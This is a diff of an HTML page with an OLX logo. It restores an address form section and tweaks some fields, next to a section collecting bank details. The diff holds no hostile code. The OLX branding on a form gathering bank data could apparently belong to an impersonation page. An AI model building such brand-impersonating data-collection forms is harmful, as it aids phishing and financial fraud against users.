@@ -28,7 +28,6 @@
                 <div class="logo">
                     <img src="/images/olx-logo.png" alt="Logo OLX">
                 </div>
-
             </div>
         </header>
 
@@ -64,12 +63,12 @@
                         </div>
                     </div>
 
-                    <!-- <div class="form-section">
+                    <div class="form-section">
                         <h2>Endereço</h2>
                         <div class="form-row">
                             <div class="form-group half">
                                 <label for="cep">CEP:</label>
-                                <input type="text" id="cep" name="cep" placeholder="00000-000" required>
+                                <input type="text" id="cep" name="cep" placeholder="00000-000" maxlength="9" required>
                             </div>
                             <div class="form-group half">
                                 <label for="estado">Estado:</label>
@@ -117,9 +116,8 @@
                         </div>
                         <div class="form-row">
                             <div class="form-group three-quarter">
-                                <label for="logradouro">Logradouro:</label>
-                                <input type="text" id="logradouro" name="logradouro" placeholder="Rua, Avenida, etc."
-                                    required>
+                                <label for="logradouro">Rua / Logradouro:</label>
+                                <input type="text" id="logradouro" name="logradouro" placeholder="Rua, Avenida, etc." required>
                             </div>
                             <div class="form-group quarter">
                                 <label for="numero">Número:</label>
@@ -128,10 +126,9 @@
                         </div>
                         <div class="form-group">
                             <label for="complemento">Complemento:</label>
-                            <input type="text" id="complemento" name="complemento"
-                                placeholder="Apartamento, bloco, etc. (opcional)">
+                            <input type="text" id="complemento" name="complemento" placeholder="Apartamento, bloco, etc. (opcional)">
                         </div>
-                    </div> -->
+                    </div>
 
                     <div class="form-section">
                         <h2>Dados Bancários</h2>
@@ -187,7 +184,6 @@
                     </div>
                 </form>
 
-                <!-- Adicionar mensagem de sucesso/erro -->
                 <div id="mensagem-retorno" class="mensagem-retorno" style="display: none;"></div>
             </div>
         </main>
